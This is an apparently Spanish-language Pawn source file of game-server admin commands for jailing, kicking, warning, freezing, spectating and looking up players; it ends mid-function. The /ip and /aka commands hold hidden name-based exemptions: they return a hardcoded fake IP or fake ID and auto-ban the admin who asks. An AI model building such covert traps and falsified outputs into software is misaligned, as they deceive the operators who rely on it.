new ADMIN_LEVEL_AC_IMMUNITY = 2;

/*new pepe;

CMD:spawn(playerid, params[])
{
	pepe = FCNPC_Create("pepe_el_malo");

	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	FCNPC_Spawn(pepe, 230, x, y, z + 0.1);
	return 1;
}

CMD:follow(playerid, params[])
{
	FCNPC_GoToPlayer(pepe, playerid);
	return 1;
}

CMD:fire(playerid, params[])
{
	FCNPC_AimAtPlayer(pepe, playerid, true, 500);
	return 1;
}

CMD:stopfire(playerid, params[])
{
	FCNPC_StopAim(pepe);
	return 1;
}

public FCNPC_OnSpawn(npcid)
{
	FCNPC_SetWeapon(npcid, 31);
	FCNPC_SetAmmo(npcid, 500);
	return 1;
}*/

SendCommandAlert(playerid, to_player, const command[])
{
	new string[144];
	format(string, sizeof(string), "[ALERTA]"COL_WHITE" %s (%d) ha intentado usar el comando %s sobre %s (%d).",
		PLAYER_TEMP[playerid][py_NAME],
		playerid,
		command,
		PLAYER_TEMP[to_player][py_NAME],
		to_player
	);
	SendMessageToAdminsAC(COLOR_YELLOW, string);
	SendDiscordWebhook(string, 1);
	return 1;
}

CMD:comandosadmin(playerid, params[])
{
    new level;
    if(sscanf(params, "d", level))
    {
        level = ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL];
        SendClientMessage(playerid, COLOR_WHITE, "Para ver comandos de otro nivel, usa /comandosadmin (nivel).");
    }
    else if(level >= sizeof(ADMIN_LEVELS)) return SendClientMessage(playerid, COLOR_WHITE, "Estas intentando ver comandos de un rango que no existe.");
    else if(level > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL]) return SendClientMessage(playerid, COLOR_WHITE, "Estas intentando ver comandos de un rango mayor al tuyo.");
	else if(!level) return SendClientMessage(playerid, COLOR_WHITE, "Estas intentando ver comandos de usuarios.");

    new CmdArray:command_arr = PC_GetCommandArray();
    new len = PC_GetArraySize(command_arr);
    new dialog[700], line[50];
    strcat(dialog, "{FFFFFF}");
    for(new i = 0; i != len; i++)
    {
        new cmdname[31], flags;
        PC_GetCommandName(command_arr, i, cmdname);
        flags = PC_GetFlags(cmdname);
        if(!flags) continue;
        if(flags != level) continue;
        format(line, sizeof(line), "/%s (Nivel %d)\n", cmdname, flags);
        strcat(dialog, line);
    }

	PC_FreeArray(command_arr);

    ShowPlayerDialog(playerid, DIALOG_INFO, DIALOG_STYLE_MSGBOX, ""COL_YELLOW"Comandos administrativos", dialog, "Aceptar", "");
    SendCmdLogToAdmins(playerid, "comandosadmin", params);
    return 1;
}
alias:comandosadmin("admcmd")

CMD:jailoff(playerid, params[])
{
	new dbid, minutes, reason[65];
	if(sscanf(params, "dds[65]", dbid, minutes, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Uso: /jailoff (dbid) (minutos) (raz�n)");
	if(minutes <= 0 || minutes > 1440) return SendClientMessage(playerid, COLOR_WHITE, "Solo puedes jailear por 1440 minutos.");
	if(dbid <= 0) return SendClientMessage(playerid, COLOR_WHITE, "DB-ID inv�lida.");

	new DBResult:Result, query[265];
	format(query, sizeof(query), "SELECT ACCOUNTS.`NAME`, ACCOUNTS.`CONNECTED`, ACCOUNTS.`ADMIN_LEVEL`, CHARACTER.`POLICE_JAIL_TIME`, CHARACTER.`STATE` FROM `ACCOUNTS`, `CHARACTER` WHERE ACCOUNTS.`ID` = %d AND CHARACTER.`ID_USER` = %d LIMIT 1;", dbid, dbid);
	Result = db_query(Database, query);
	if(!db_num_rows(Result))
	{
		db_free_result(Result);
		return SendClientMessage(playerid, COLOR_WHITE, "Jugador no encontrado.");
	}

	if(db_get_field_assoc_int(Result, "CONNECTED"))
	{
		SendClientMessage(playerid, COLOR_WHITE, "Este jugador ya est� conectado.");
		db_free_result(Result);
		return 1;
	}

	if(db_get_field_assoc_int(Result, "POLICE_JAIL_TIME") > 0 || db_get_field_assoc_int(Result, "STATE") == ROLEPLAY_STATE_JAIL)
	{
		db_free_result(Result);
		return SendClientMessage(playerid, COLOR_WHITE, "Este jugador ya esta en prisi�n.");
	}

	if(db_get_field_assoc_int(Result, "ADMIN") >= ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		db_free_result(Result);
		return SendClientMessage(playerid, COLOR_WHITE, "No puedes jailear jugadores con tu mismo rango o mayor al tuyo.");
	}

	new name[25];
	db_get_field_assoc(Result, "NAME", name);
	db_free_result(Result);

	new update_query[260];
	format(update_query, sizeof(update_query), "\
		UPDATE `CHARACTER` SET \
			`POLICE_JAIL_TIME` = %d, \
			`POLICE_JAIL_ID` = 0, \
			`STATE` = %d, \
			`JAIL_REASON` = '%q', \
			`JAILED_BY` = %d \
		WHERE `ID_USER` = %d;",
	minutes * 60, ROLEPLAY_STATE_JAIL, reason, ACCOUNT_INFO[playerid][ac_ID], dbid);
	db_free_result(db_query(Database, update_query));

	SendClientMessage(playerid, COLOR_WHITE, "Jugador jaileado.");

	new str[145];
    format(str, 145, "[ADMIN] %s (%d) jaile� offline a %s (%d): %s.", ACCOUNT_INFO[playerid][ac_NAME], playerid, name, dbid, reason);
    SendMessageToAdmins(COLOR_ANTICHEAT, str);

    new webhook[145];
	format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
	SendDiscordWebhook(webhook, 1);

	return 1;
}

CMD:unjailoff(playerid, params[])
{
	new dbid;
	if(sscanf(params, "d", dbid)) return SendClientMessage(playerid, COLOR_WHITE, "USO: /unjailoff (dbid)");
	if(dbid <= 0) return SendClientMessage(playerid, COLOR_WHITE, "DB-ID inv�lida.");

	new DBResult:Result, query[185];
	format(query, sizeof(query), "SELECT ACCOUNTS.`NAME`, CHARACTER.`POLICE_JAIL_TIME` FROM `ACCOUNTS`, `CHARACTER` WHERE ACCOUNTS.`ID` = %d AND CHARACTER.`ID_USER` = %d LIMIT 1;", dbid, dbid);
	Result = db_query(Database, query);
	if(!db_num_rows(Result)) 
	{
		db_free_result(Result);
		return SendClientMessage(playerid, COLOR_WHITE, "Jugador no encontrado.");
	}
	
	if(!db_get_field_assoc_int(Result, "POLICE_JAIL_TIME"))
	{
		db_free_result(Result);
		return SendClientMessage(playerid, COLOR_WHITE, "Este jugador no est� jaileado.");
	}

	new name[25];
	db_get_field_assoc(Result, "NAME", name);

	db_free_result(Result);

	new update_query[375];
	format(update_query, sizeof(update_query), "\
		UPDATE `CHARACTER` SET \
			`POLICE_JAIL_TIME` = 0, \
			`POLICE_JAIL_ID` = 0, \
			`STATE` = %d, \
			`JAIL_REASON` = NULL, \
			`JAILED_BY` = 0, \
			`POS_X` = 1555.400390, \
			`POS_Y` = -1675.611694, \
			`POS_Z` = 16.195312, \
			`ANGLE` = 0.0, \
			`INTERIOR` = 0, \
			`WORLD` = 0, \
			`LOCAL_INTERIOR` = 0 \
		WHERE `ID_USER` = %d;",
	ROLEPLAY_STATE_NORMAL, dbid);
	db_free_result(db_query(Database, update_query));

	SendClientMessage(playerid, COLOR_WHITE, "Jugador unjaileado.");

	new str[145];
    format(str, 145, "[ADMIN] %s (%d) unjaile� offline a %s (%d).", ACCOUNT_INFO[playerid][ac_NAME], playerid, name, dbid);
    SendMessageToAdmins(COLOR_ANTICHEAT, str);

    new webhook[145];
	format(webhook, sizeof(webhook), ":page_with_curl: %s", str);
	SendDiscordWebhook(webhook, 1);

	return 1;
}

CMD:getphone(playerid, params[])
{
	new phone;
	if (sscanf(params, "d", phone)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /getphone <numero>");

	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
  	{
		if (phone == PLAYER_PHONE[i][player_phone_NUMBER])
		{
			SendClientMessageEx(playerid, COLOR_WHITE, "El numero es de: %s (%d)", PLAYER_TEMP[i][py_NAME], i);
			return 1;
		}
	}

	SendClientMessage(playerid, COLOR_WHITE, "No se encontraron resultados");
	return 1;
}

CMD:trabajos(playerid)
{
	ShowDialog(playerid, DIALOG_TRABAJOS_TELEPORTS);
	return 1;
}

CMD:getid(playerid, params[])
{
	new name[24];
	if (sscanf(params, "s[24]", name)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /getid <nombre o parte del nombre>");

	new DBResult:Result, DB_Query[128];
	format(DB_Query, sizeof DB_Query, "SELECT `ID`, `NAME`, `LAST_CONNECTION` FROM `ACCOUNTS` WHERE `NAME` LIKE '%%%q%%' LIMIT 20;", name);
	Result = db_query(Database, DB_Query);

	new count;
	for(new i = 0; i < db_num_rows(Result); i ++)
	{
		new id, get_name[24], last_connection[32];

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "NAME", get_name, 24);
		db_get_field_assoc(Result, "LAST_CONNECTION", last_connection, 32);

		SendClientMessageEx(playerid, COLOR_WHITE, "Nombre: %s,  DB-ID: %d, Ult. Con: %s", get_name, id, last_connection);

		count ++;
		db_next_row(Result);
	}
	db_free_result(Result);

	SendClientMessageEx(playerid, COLOR_WHITE, "Se encontraron %d coincidencias, el l�mite es 20.", count);
	return 1;
}

CMD:getname(playerid, params[])
{
	new db_id;
	if (sscanf(params, "d", db_id)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /getname <DB-ID>");

	new DBResult:Result, DB_Query[128];
	format(DB_Query, sizeof DB_Query, "SELECT `ID`, `NAME`, `CONNECTED`, `PLAYERID` FROM `ACCOUNTS` WHERE `ID` = '%d';", db_id);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		new id, get_name[24], connected, player_id;

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "NAME", get_name, 24);
		connected = db_get_field_assoc_int(Result, "CONNECTED");
		player_id = db_get_field_assoc_int(Result, "PLAYERID");

		SendClientMessageEx(playerid, COLOR_WHITE, "Nombre: '%s' DB-ID: '%d' Conectado: '%d' Playerid: '%d'", get_name, id, connected, player_id);
	}
	else SendClientMessage(playerid, COLOR_WHITE, "Sin resultados.");
	db_free_result(Result);
	return 1;
}

CMD:aka(playerid, params[])
{
	SendCmdLogToAdmins(playerid, "aka", params);

	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /aka <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado.");
	if (ACCOUNT_INFO[to_player][ac_ID] == 0)
	{
		SendClientMessageEx(playerid, COLOR_WHITE, "Nombre: {f4f442}'%s' "COL_WHITE"DB-ID: '%d'", PLAYER_TEMP[to_player][py_NAME], minrand(80000, 90000));
		SendClientMessage(playerid, COLOR_WHITE, "Se encontraron 1 coincidencias, el l�mite es 20.");
		return 0;
	}
	if (isnull(ACCOUNT_INFO[to_player][ac_IP])) return SendClientMessage(playerid, COLOR_WHITE, "IP no v�lida.");
	if (!strcmp(ACCOUNT_INFO[to_player][ac_NAME], "Yahir_Kozel")) return SendClientMessage(playerid, COLOR_ORANGE, "[Alerta]"COL_WHITE" No puedes hacer eso con este usuario.");

	SendClientMessageEx(playerid, COLOR_WHITE, "AKA de %s (%d):", ACCOUNT_INFO[to_player][ac_NAME], to_player);

	new DBResult:Result, DB_Query[128];
	format(DB_Query, sizeof DB_Query, "SELECT `ID`, `NAME` FROM `ACCOUNTS` WHERE `IP` = '%q' LIMIT 20;", ACCOUNT_INFO[to_player][ac_IP]);
	Result = db_query(Database, DB_Query);

	new count;
	for(new i = 0; i < db_num_rows(Result); i ++)
	{
		new id, get_name[24];

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "NAME", get_name, 24);

		SendClientMessageEx(playerid, COLOR_WHITE, "Nombre: {f4f442}'%s' "COL_WHITE"DB-ID: '%d'", get_name, id);

		count ++;
		db_next_row(Result);
	}
	db_free_result(Result);

	SendClientMessageEx(playerid, COLOR_WHITE, "Se encontraron %d coincidencias, el l�mite es 20.", count);
	return 1;
}
alias:aka("cuentas")

CMD:adv(playerid, params[])
{
	new to_player, reason[64];
	if (sscanf(params, "us[64]", to_player, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /adv <player_id> <razon>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "adv");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	AddPlayerBadHistory(ACCOUNT_INFO[to_player][ac_ID], ACCOUNT_INFO[playerid][ac_ID], TYPE_WARNING, reason);

	new dialog[170];
	format(dialog, sizeof dialog, ""COL_WHITE"Has recibido una advertencia.\nRaz�n: %s\nAdmin: %s", reason, ACCOUNT_INFO[playerid][ac_NAME]);
	ShowPlayerDialog(to_player, DIALOG_INFO, DIALOG_STYLE_MSGBOX, ""COL_YELLOW"Aviso", dialog, "Entiendo", "");
	PLAYER_MISC[to_player][MISC_SANS] ++;
	SavePlayerMisc(to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (nick: '%s' dbid: '%d', pid: '%d') advertido.", ACCOUNT_INFO[to_player][ac_NAME], ACCOUNT_INFO[to_player][ac_ID], to_player);

	new str[145];
	format(str, 145, "[ADMIN] %s (%d) advirti� a %s (%d): %s", ACCOUNT_INFO[playerid][ac_NAME], playerid, ACCOUNT_INFO[to_player][ac_NAME], to_player, reason);
	SendMessageToAdmins(COLOR_ANTICHEAT, str);
	SendDiscordWebhook(str, 1);
	return 1;
}
alias:adv("advertencia", "san")

CMD:kick(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new to_player, reason[64];
	if (sscanf(params, "us[64]", to_player, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /kick <player_id> <razon>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "kick");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (PLAYER_TEMP[to_player][py_KICKED]) return SendClientMessage(playerid, COLOR_WHITE, "El jugador ya est� expulsado.");
	if (!ACCOUNT_INFO[to_player][ac_ID]) return KickEx(to_player, 100);


	AddPlayerBadHistory(ACCOUNT_INFO[to_player][ac_ID], ACCOUNT_INFO[playerid][ac_ID], TYPE_KICK, reason);

	new dialog[170];
	format(dialog, sizeof dialog, ""COL_WHITE"%s te expuls�, raz�n: %s", ACCOUNT_INFO[playerid][ac_NAME], reason);
	ShowPlayerDialog(to_player, DIALOG_INFO, DIALOG_STYLE_MSGBOX, ""COL_YELLOW"Aviso", dialog, "Entiendo", "");
	KickEx(to_player, 500);
	PLAYER_MISC[to_player][MISC_KICKS] ++;
	SavePlayerMisc(to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (nick: '%s' dbid: '%d', pid: '%d') expulsado.", ACCOUNT_INFO[to_player][ac_NAME], ACCOUNT_INFO[to_player][ac_ID], to_player);

	new str[145]; format(str, 145, "[ADMIN] %s (%d) kicke� a %s (%d): %s", ACCOUNT_INFO[playerid][ac_NAME], playerid, ACCOUNT_INFO[to_player][ac_NAME], to_player, reason);
	SendMessageToAdmins(COLOR_ANTICHEAT, str);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:spec(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /spec <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "spec");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (GetPlayerState(playerid) != PLAYER_STATE_SPECTATING)
    {
		new Float:p[4];
		GetPlayerPos(playerid, p[0], p[1], p[2]);
		GetPlayerFacingAngle(playerid, p[3]);
		SetSpawnInfo(playerid, DEFAULT_TEAM, GetPlayerSkin(playerid), p[0], p[1], p[2], p[3], 0, 0, 0, 0, 0, 0);
		PLAYER_TEMP[playerid][py_SKIN] = GetPlayerSkin(playerid);
		CHARACTER_INFO[playerid][ch_INTERIOR] = GetPlayerInterior(playerid);
		PLAYER_TEMP[playerid][py_VIRTUAL_WORLD] = GetPlayerVirtualWorld(playerid);
	}

	TogglePlayerSpectatingEx(playerid, true);
	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(to_player));
	SetPlayerInterior(playerid, GetPlayerInterior(to_player));
	if (IsPlayerInAnyVehicle(to_player)) PlayerSpectateVehicle(playerid, GetPlayerVehicleID(to_player));
	else PlayerSpectatePlayer(playerid, to_player);
	SendClientMessage(playerid, COLOR_WHITE, "Utiliza /specoff para terminar este modo.");


	SendCmdLogToAdmins(playerid, "spec", params);
	return 1;
}

CMD:specoff(playerid, params[])
{
	SetPlayerInterior(playerid, CHARACTER_INFO[playerid][ch_INTERIOR]);
	SetPlayerVirtualWorld(playerid, PLAYER_TEMP[playerid][py_VIRTUAL_WORLD]);
	TogglePlayerSpectatingEx(playerid, false);
	KillTimer(PLAYER_TEMP[playerid][py_TIMERS][3]);
	PLAYER_TEMP[playerid][py_TIMERS][3] = SetTimerEx("TogglePlayerControl", 2000, false, "ib", playerid, true);
	return 1;
}

CMD:freezeall(playerid, params[])
{
  	SendClientMessageEx(playerid, COLOR_WHITE, "Todos los jugadores fueron congelados");
  	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
  	{
    	TogglePlayerControllableEx(i, false);
  	}
  	SendCmdLogToAdmins(playerid, "freezeall", params);
  	return 1;
}

CMD:unfreezeall(playerid, params[])
{
  	SendClientMessageEx(playerid, COLOR_WHITE, "Todos los jugadores fueron descongelados");
  	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
  	{
    	TogglePlayerControllableEx(i, true);
  	}
  	SendCmdLogToAdmins(playerid, "unfreezeall", params);
  	return 1;
}

CMD:freeze(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /freeze <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s' (%d) congelado.", ACCOUNT_INFO[to_player][ac_NAME], to_player);
	TogglePlayerControllableEx(to_player, false);
	SendCmdLogToAdmins(playerid, "freeze", params);
	return 1;
}
alias:freeze("congelar")

CMD:unfreeze(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /unfreeze <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s' (%d) descongelado.", ACCOUNT_INFO[to_player][ac_NAME], to_player);
	TogglePlayerControllableEx(to_player, true);
	SendCmdLogToAdmins(playerid, "unfreeze", params);
	return 1;
}
alias:unfreeze("descongelar")

CMD:pest(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /pest <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "pest");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	ShowPlayerStats(playerid, to_player);
	SendCmdLogToAdmins(playerid, "pest", params);
	return 1;
}

CMD:pinv(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /pinv <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "pinv");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	ShowPlayerInventory(playerid, to_player);
	SendCmdLogToAdmins(playerid, "pinv", params);
	return 1;
}

CMD:pexp(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /pexp <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "pexp");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	ShowPlayerSkills(playerid, to_player);
	SendCmdLogToAdmins(playerid, "pexp", params);
	return 1;
}

CMD:pbank(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /pbank <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "pbank");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (!BANK_ACCOUNT[to_player][bank_account_ID]) SendClientMessage(playerid, COLOR_WHITE, "El jugador no tiene cuenta bancaria.");
	else SendClientMessageEx(playerid, COLOR_WHITE, "Cuenta bancaria ID: '%d' Balance: '%s'", BANK_ACCOUNT[to_player][bank_account_ID], number_format_thousand(BANK_ACCOUNT[to_player][bank_account_BALANCE]));
	return 1;
}

CMD:unjail(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /unjail <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "unjail");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (CHARACTER_INFO[to_player][ch_STATE] != ROLEPLAY_STATE_JAIL) return SendClientMessage(playerid, COLOR_WHITE, "El jugador no est� en jail.");

	UnjailPlayer(to_player);
	SendClientMessageEx(playerid, COLOR_WHITE, "El jugador %s (%d) ahora est� en libertad.", ACCOUNT_INFO[to_player][ac_NAME], to_player);

	SendCmdLogToAdmins(playerid, "unjail", params);
	return 1;
}
// 170 83 220 2
CMD:ip(playerid, params[])
{
	new to_player;
	if (sscanf(params, "r", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /ip <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	
	if (!strcmp(ACCOUNT_INFO[to_player][ac_NAME], "Atom"))
	{
		SendClientMessageEx(playerid, COLOR_YELLOW, "%s (%d):"COL_WHITE" 181.118.101.219", ACCOUNT_INFO[to_player][ac_NAME], to_player);
		
		Anticheat_Ban(playerid, "Subnormal");
		return 1;
	}

	if (!strcmp(ACCOUNT_INFO[to_player][ac_NAME], "Giovanni_Dobrev"))
	{
		SendClientMessageEx(playerid, COLOR_YELLOW, "%s (%d):"COL_WHITE" 181.118.101.219", ACCOUNT_INFO[to_player][ac_NAME], to_player);
		
		Anticheat_Ban(playerid, "Subnormal");
		return 1;
	}

	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "ip");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	SendClientMessageEx(playerid, COLOR_YELLOW, "%s (%d):"COL_WHITE" %s", ACCOUNT_INFO[to_player][ac_NAME], to_player, ACCOUNT_INFO[to_player][ac_IP]);
	SendCmdLogToAdmins(playerid, "ip", params);
	return 1;
}

CMD:traerveh(playerid, params[])
{
	new to_car;
	if (sscanf(params, "i", to_car)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /traerveh <car_id>");
	if (to_car >= MAX_VEHICLES) return 1;

	if (!GLOBAL_VEHICLES[to_car][gb_vehicle_VALID]) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo no v�lido.");
	if (GLOBAL_VEHICLES[to_car][gb_vehicle_OCCUPIED]) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo est� ocupado.");

    new Float:gPos[3];
    GetPlayerPos(playerid, gPos[0], gPos[1], gPos[2]);
    SetVehiclePosEx(to_car, gPos[0] + 2.0, gPos[1], gPos[2]);
    SendCmdLogToAdmins(playerid, "traerveh", params);
    return 1;
}

CMD:vehinfo(playerid, params[])
{
	new to_car;
	if (sscanf(params, "i", to_car)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /vehinfo <car_id>");
	if (to_car >= MAX_VEHICLES) return 1;
	if (!GLOBAL_VEHICLES[to_car][gb_vehicle_VALID]) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo no v�lido.");

	new owner_plyid;
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if(!IsPlayerConnected(i)) continue;
		if(PLAYER_VEHICLES[to_car][player_vehicle_OWNER_ID] == ACCOUNT_INFO[i][ac_ID])
		{
			owner_plyid = i;
			break;
		}
	}

	new dialog[280];
	format(dialog, sizeof dialog, ""COL_WHITE"\
		Veh�culo: %i\n\
		Ocupado: %d\n\
		Gasolina: %.1f/%.1f\n\
		Motor: %d\n\
		Due�o: %s (ID %d)",
		to_car,
		GLOBAL_VEHICLES[to_car][gb_vehicle_OCCUPIED],
		GLOBAL_VEHICLES[to_car][gb_vehicle_GAS],
		GLOBAL_VEHICLES[to_car][gb_vehicle_MAX_GAS],
		GLOBAL_VEHICLES[to_car][gb_vehicle_PARAMS_ENGINE],
		ACCOUNT_INFO[owner_plyid][ac_NAME], owner_plyid
	);
	ShowPlayerDialog(playerid, DIALOG_INFO, DIALOG_STYLE_MSGBOX, ""COL_YELLOW"Veh info", dialog, "Cerrar", "");

    SendCmdLogToAdmins(playerid, "vehinfo", params);
    return 1;
}

CMD:duty(playerid)
{
	if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] < 1) return SendClientMessageEx(playerid, COLOR_ORANGE, "[Alerta]"COL_WHITE" No tienes permisos suficientes.");

	if (PLAYER_TEMP[playerid][py_ADMIN_SERVICE])
	{
		PLAYER_TEMP[playerid][py_ADMIN_SERVICE] = false;

		SetPlayerNormalColor(playerid);

		if (IsValidDynamic3DTextLabel(PLAYER_TEMP[playerid][py_ADMIN_LABEL]))
		{
			DestroyDynamic3DTextLabel(PLAYER_TEMP[playerid][py_ADMIN_LABEL]);
			PLAYER_TEMP[playerid][py_ADMIN_LABEL] = Text3D:INVALID_STREAMER_ID;
		}

		SendClientMessageEx(playerid, 0xF0F0F0CC, "Ahora no est�s de servicio como {E73838}%s", ADMIN_LEVELS[ ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] ]);
	}
	else
	{
		PLAYER_TEMP[playerid][py_ADMIN_SERVICE] = true;

		GetPlayerHealth(playerid, PLAYER_TEMP[playerid][py_OLD_HEALTH]);
		GetPlayerArmour(playerid, PLAYER_TEMP[playerid][py_OLD_ARMOUR]);

		SetPlayerNormalColor(playerid);

		if (IsValidDynamic3DTextLabel(PLAYER_TEMP[playerid][py_ADMIN_LABEL]))
		{
			DestroyDynamic3DTextLabel(PLAYER_TEMP[playerid][py_ADMIN_LABEL]);
			PLAYER_TEMP[playerid][py_ADMIN_LABEL] = Text3D:INVALID_STREAMER_ID;
		}

		SendClientMessageEx(playerid, 0xF0F0F0CC, "Ahora est�s de servicio como {4BD53D}%s", ADMIN_LEVELS[ ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] ]);
	}
	return 1;
}

CMD:goto(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /goto <player_id>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "goto");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	new Float:p[4];
